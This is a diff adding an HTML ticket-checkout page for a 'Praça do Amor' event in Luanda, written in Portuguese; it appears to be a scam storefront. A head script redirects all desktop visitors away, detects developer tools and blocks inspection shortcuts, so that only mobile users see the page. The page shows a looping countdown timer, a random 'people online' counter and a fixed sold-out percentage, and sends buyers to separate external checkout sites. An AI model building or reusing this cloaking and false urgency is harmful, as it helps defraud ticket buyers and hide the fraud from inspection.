@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    
+        <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1805883483456008');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1805883483456008&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script>
+(function() {
+
+  const target = "https://site-indisponivel-agora-30.vercel.app/";
+
+  // Detectar se é mobile real
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                   .test(navigator.userAgent);
+
+  // Função para detetar DevTools
+  function isDevToolsOpen() {
+    let opened = false;
+
+    // Método 1 - diferença normal entre outerHeight e innerHeight
+    if (window.outerHeight - window.innerHeight > 160) {
+      opened = true;
+    }
+
+    // Método 2 - largura anormal da janela por causa do device toolbar
+    if (window.outerWidth - window.innerWidth > 160) {
+      opened = true;
+    }
+
+    // Método 3 - atraso causado pelo "debugger"
+    const t0 = performance.now();
+    debugger;
+    const t1 = performance.now();
+    if (t1 - t0 > 200) {
+      opened = true;
+    }
+
+    return opened;
+  }
+
+
+  // ==========================================================
+  // NOVA REGRA: PC EM MODO MOBILE (DevTools mobile) → BLOQUEAR
+  // ==========================================================
+  if (!isMobile) {   // só PC
+
+    // Se DevTools está aberto ANTES da página abrir → redireciona
+    if (isDevToolsOpen()) {
+      window.location.replace(target);
+    }
+
+    // Monitor contínuo — garante que qualquer tentativa é apanhada
+    setInterval(function() {
+      if (isDevToolsOpen()) {
+        window.location.replace(target);
+      }
+    }, 300);
+  }
+
+
+
+  // ======================
+  // JÁ EXISTIA: bloqueio total só para DESKTOP real
+  // ======================
+  if (!isMobile) {
+
+    try {
+      window.location.replace(target);
+    } catch (e) {
+      window.location.href = target;
+    }
+
+    // Bloqueio de clique direito
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    // Bloqueio de teclas
+    document.onkeydown = function(e) {
+      if (e.keyCode === 123) return false; // F12
+      if (e.ctrlKey && e.shiftKey && [73,67,74].includes(e.keyCode)) return false; 
+      if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
+    };
+
+    // DevTools detection (já existente)
+    setInterval(function() {
+      const start = performance.now();
+      debugger;
+      const end = performance.now();
+      if (end - start > 200) {
+        window.location.replace(target);
+      }
+    }, 500);
+
+    // Altura da janela (já existente)
+    setInterval(function() {
+      if (window.outerHeight - window.innerHeight > 160) {
+        window.location.replace(target);
+      }
+    }, 300);
+
+    return;
+  }
+
+
+  // ======================
+  // MOBILE REAL
+  // ======================
+  // Aqui não tocamos. Tudo normal.
+
+})();
+</script>
+
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Check-In | Praça do Amor</title><script src="https://cdn.tailwindcss.com"></script><link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400;600;800&display=swap" rel="stylesheet"><style>
+        :root {
+            --font-primary: 'Montserrat', sans-serif;
+            --font-secondary: 'Cinzel', serif;
+            --gold-primary: #D4AF37;
+            --gold-dark: #8E6E36;
+            --pink-accent: #db2777;
+        }
+
+        body {
+            background-color: #000000;
+            color: #bd9c9c;
+            font-family: var(--font-primary);
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        .serif-font { font-family: var(--font-secondary); }
+
+        .ticket-card {
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(12px);
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            overflow: hidden;
+        }
+
+        .ticket-card::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 0; height: 100%; width: 4px;
+            background: transparent;
+            transition: all 0.3s ease;
+        }
+
+        .ticket-card.selected {
+            border-color: rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-2px);
+        }
+
+        .ticket-card.selected::before {
+            background: var(--pink-accent);
+            box-shadow: 0 0 15px var(--pink-accent);
+        }
+
+        .gold-border.selected::before {
+            background: var(--gold-primary);
+            box-shadow: 0 0 15px var(--gold-primary);
+        }
+
+        .btn-gradient {
+            background: linear-gradient(135deg, #C5A059 0%, #8E6E36 100%);
+        }
+
+        /* Slider Animation */
+        .slider-track {
+            display: flex;
+            width: calc(250px * 6);
+            animation: scroll 20s linear infinite;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(calc(-250px * 3)); }
+        }
+
+        .hidden-step { display: none; }
+        
+        .premium-card {
+            border-radius: 1.5rem;
+            border: 1px dashed rgba(244, 63, 94, 0.3);
+            background: rgba(244, 63, 94, 0.05);
+        }
+
+        .ticket-card.sold-out {
+            opacity: 0.5;
+            cursor: not-allowed;
+            filter: grayscale(0.8);
+        }
+
+        .btn-checkout {
+            background: linear-gradient(135deg, #C5A059 0%, #8E6E36 100%);
+            box-shadow: 0 0 30px rgba(197, 160, 89, 0.6), 0 8px 25px rgba(197, 160, 89, 0.4);
+            animation: pulse-btn 2s infinite;
+        }
+
+        .btn-checkout:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 40px rgba(197, 160, 89, 0.8), 0 12px 35px rgba(197, 160, 89, 0.6);
+        }
+
+        @keyframes pulse-btn {
+            0%, 100% { box-shadow: 0 0 30px rgba(197, 160, 89, 0.6), 0 8px 25px rgba(197, 160, 89, 0.4); }
+            50% { box-shadow: 0 0 50px rgba(197, 160, 89, 0.9), 0 8px 25px rgba(197, 160, 89, 0.6); }
+        }
+    </style></head>
+    
+    
+    
+    
+    
+    
+    
+
+<body class="max-w-md mx-auto min-h-screen pb-12 px-5">
+
+    <header class="flex justify-between items-center py-8">
+        <img src="images/VwE6XYw3Fgy3.png" alt="Logo Check-In" class="h-8 object-contain">
+        <div class="text-[9px] uppercase tracking-[0.15em] text-gray-400 font-bold">Pagamento Seguro</div>
+    </header>
+
+    <!-- STEP 1: SELEÇÃO DE LOTES -->
+    <main id="step-selection">
+        <div class="relative w-full aspect-square rounded-[45px] overflow-hidden shadow-2xl mb-8 border border-white/10">
+            <img src="images/WZMSYG95Gl5O.jpg" alt="Capa Praça do Amor" class="w-full h-full object-cover">
+            <div class="absolute inset-x-0 bottom-0 h-1/3 bg-gradient-to-t from-black/90 to-transparent"></div>
+        </div>
+
+        <div class="text-center mb-10">
+            <p class="text-[11px] tracking-[0.35em] uppercase text-yellow-600 font-extrabold mb-3">Apresenta</p>
+            <h1 class="serif-font text-5xl tracking-wide mb-2 font-bold uppercase">Praça do Amor</h1>
+            <p class="text-[10px] text-gray-500 tracking-[0.3em] font-semibold">14 DE FEVEREIRO • LUANDA</p>
+        </div>
+
+        <div class="space-y-4 mb-10">
+            <!-- 1º Lote -->
+            <div class="ticket-card rounded-[24px] p-6 flex justify-between items-center cursor-pointer select-none" data-link="https://check-in-lote-1.vercel.app/" onclick="selectCard(this)">
+                <div class="space-y-1">
+                    <h4 class="text-sm font-bold uppercase tracking-wider">1º Lote</h4>
+                    <p class="text-[10px] text-gray-500 font-semibold">Área Normal • Sem consumo</p>
+                    <p class="text-[10px] text-pink-600 font-extrabold uppercase tracking-widest pt-1">32 Vagas</p>
+                </div>
+                <div class="text-xl font-extrabold tracking-tighter">7.500 Kz</div>
+            </div>
+
+            <!-- 2º Lote -->
+            <div class="ticket-card rounded-[24px] p-6 flex justify-between items-center cursor-pointer select-none" data-link="https://check-in-lote-2-theta.vercel.app/" onclick="selectCard(this)">
+                <div class="space-y-1">
+                    <h4 class="text-sm font-bold uppercase tracking-wider">2º Lote Área VIP</h4>
+                    <p class="text-[10px] text-gray-500 font-semibold">2 Pessoas • Desconto Especial</p>
+                    <p class="text-[10px] text-pink-600 font-extrabold uppercase tracking-widest pt-1">18 Vagas</p>
+                </div>
+                <div class="text-xl font-extrabold tracking-tighter">15.000 Kz</div>
+            </div>
+
+            <!-- Área VIP Lounge -->
+            <div class="relative">
+                <div class="ticket-card gold-border rounded-[24px] p-6 flex justify-between items-center cursor-pointer select-none" data-link="https://check-in-lounger.vercel.app/" onclick="selectCard(this)">
+                    <div class="space-y-1">
+                        <h4 class="text-sm font-extrabold uppercase tracking-wider text-yellow-500">Área VIP Lounge</h4>
+                        <p class="text-[10px] text-gray-400 font-semibold">Acesso p/ 2-4 pessoas</p>
+                        <p class="text-[10px] text-pink-600 font-extrabold uppercase tracking-widest pt-1">Apenas 6 Vagas</p>
+                    </div>
+                    <div class="text-xl font-black text-yellow-500 tracking-tighter">30.000 Kz</div>
+                </div>
+                <div class="absolute -top-3 -right-3 bg-red-600 text-white text-[9px] font-black uppercase tracking-wider px-3 py-1 rounded-full shadow-lg z-50">Mais Vendido</div>
+            </div>
+
+            <!-- Mesa Pé Alto -->
+            <div class="ticket-card sold-out rounded-[24px] p-6 flex justify-between items-center select-none">
+                <div class="space-y-1">
+                    <h4 class="text-sm font-bold uppercase tracking-wider text-white/60">Mesa Pé Alto</h4>
+                    <p class="text-[10px] text-gray-500 font-semibold">Acesso VIP p/ 6 Pessoas</p>
+                    <p class="text-[10px] text-rose-600 font-extrabold uppercase tracking-widest pt-1">Esgotado</p>
+                </div>
+                <div class="text-xl font-extrabold tracking-tighter text-white/40 line-through">1.000.000 Kz</div>
+            </div>
+        </div>
+
+        <button id="confirm-selection-btn" onclick="showOfferStep()" class="w-full py-6 rounded-full btn-gradient text-black font-black text-xs uppercase tracking-[0.3em] shadow-[0_15px_40px_rgba(142,110,54,0.4)] opacity-50 cursor-not-allowed mb-8" disabled="">
+            Confirmar Reserva
+        </button>
+    </main>
+
+    <!-- STEP 2: OFERTA ESPECIAL -->
+    <div id="step-offer" class="hidden-step text-center py-4">
+        <h2 class="text-4xl serif-font italic mb-4">Oferta Especial</h2>
+        <p class="text-[10px] text-gray-400 mb-8 px-4 uppercase tracking-[0.15em] leading-relaxed">
+            🎁 KIT OFICIAL GRATUITO — EXCLUSIVO PARA QUEM COMPRAR OS INGRESSOS HOJE E AGORA!<br>
+            Garanta já o seu ingresso e receba o Kit Oficial totalmente grátis. Promoção válida somente para compras realizadas agora!
+        </p>
+        
+        <div class="slider-container overflow-hidden mb-12 relative">
+            <div class="slider-track">
+                <img src="images/IWufsee8TR0Q.jpg" class="w-[230px] h-[300px] object-cover rounded-2xl mx-2">
+                <img src="images/mZCdzatnSiDm.jpg" class="w-[230px] h-[300px] object-cover rounded-2xl mx-2">
+                <img src="images/J9w8SyvILFQj.jpg" class="w-[230px] h-[300px] object-cover rounded-2xl mx-2">
+                <!-- Clones para scroll infinito -->
+                <img src="images/IWufsee8TR0Q.jpg" class="w-[230px] h-[300px] object-cover rounded-2xl mx-2">
+                <img src="images/mZCdzatnSiDm.jpg" class="w-[230px] h-[300px] object-cover rounded-2xl mx-2">
+                <img src="images/J9w8SyvILFQj.jpg" class="w-[230px] h-[300px] object-cover rounded-2xl mx-2">
+            </div>
+        </div>
+
+        <button onclick="redirectToCheckout()" class="w-full btn-checkout py-6 rounded-2xl text-black font-black text-[11px] uppercase tracking-[0.3em] shadow-xl transition-all duration-300">
+            Finalizar minha Compra
+        </button>
+        
+        <p class="text-[9px] text-gray-500 mt-6 uppercase tracking-widest cursor-pointer hover:text-white transition-colors" onclick="location.reload()">
+            ← Voltar para seleção
+        </p>
+    </div>
+
+    <!-- Barra de Urgência (Sempre visível) -->
+    <div class="mt-8 space-y-4">
+        <div class="premium-card p-4">
+            <div class="flex justify-between items-center mb-2">
+                <span class="text-[10px] font-bold uppercase tracking-widest text-rose-500 animate-pulse">🔥 ALTA PROCURA: 94% VENDIDOS</span>
+                <span id="live-timer" class="text-[10px] font-mono text-white bg-rose-600 px-2 py-0.5 rounded">05:00</span>
+            </div>
+            <div class="h-1.5 w-full bg-zinc-800 rounded-full overflow-hidden">
+                <div class="h-full bg-gradient-to-r from-rose-600 to-orange-500" style="width: 94%"></div>
+            </div>
+        </div>
+
+        <div class="flex items-center justify-center space-x-2 pb-10 opacity-60">
+            <span class="relative flex h-2 w-2">
+                <span class="animate-ping absolute h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+            </span>
+            <span class="text-[10px] text-zinc-400 uppercase tracking-widest font-semibold">
+                <strong class="text-white" id="online-count">52</strong> pessoas online
+            </span>
+        </div>
+    </div>
+
+    <script>
+        let selectedLink = "";
+
+        function selectCard(element) {
+            if (element.classList.contains('sold-out')) return;
+            document.querySelectorAll('.ticket-card').forEach(c => c.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedLink = element.getAttribute('data-link');
+            
+            const btn = document.getElementById('confirm-selection-btn');
+            btn.disabled = false;
+            btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            btn.textContent = "Confirmar Reserva";
+        }
+
+        function showOfferStep() {
+            document.getElementById('step-selection').classList.add('hidden-step');
+            document.getElementById('step-offer').classList.remove('hidden-step');
+            window.scrollTo(0, 0);
+        }
+
+        function redirectToCheckout() {
+            if (selectedLink) {
+                window.location.href = selectedLink;
+            }
+        }
+
+        function startTimer(duration, display) {
+            let timer = duration;
+            setInterval(() => {
+                let minutes = Math.floor(timer / 60);
+                let seconds = timer % 60;
+                display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                if (--timer < 0) timer = duration;
+            }, 1000);
+        }
+
+        window.onload = () => {
+            startTimer(300, document.querySelector('#live-timer'));
+            setInterval(() => {
+                const el = document.getElementById('online-count');
+                el.textContent = Math.max(45, Math.min(70, parseInt(el.textContent) + (Math.random() > 0.5 ? 1 : -1)));
+            }, 3000);
+        };
+    </script>
+
+</body></html>
